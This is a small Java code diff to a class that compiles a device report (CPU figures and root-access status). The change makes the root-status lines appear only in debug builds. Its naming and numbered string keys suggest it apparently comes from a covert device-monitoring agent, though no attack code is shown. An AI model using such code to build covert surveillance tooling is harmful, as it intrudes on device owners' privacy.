@@ -124,10 +124,12 @@ public class ModuleDevice extends BaseInstantModule {
 		sb.append(Messages.getString("9.11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		sb.append(Messages.getString("9.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
-		if (Status.self().haveRoot()) {
-			sb.append(Messages.getString("9.15") + "\n"); //$NON-NLS-1$
-		} else {
-			sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
+		if (Cfg.DEBUG) {
+			if (Status.self().haveRoot()) {
+				sb.append(Messages.getString("9.15") + "\n"); //$NON-NLS-1$
+			} else {
+				sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
+			}
 		}
 
 		sb.append(Messages.getString("9.17") + "\n"); //$NON-NLS-1$
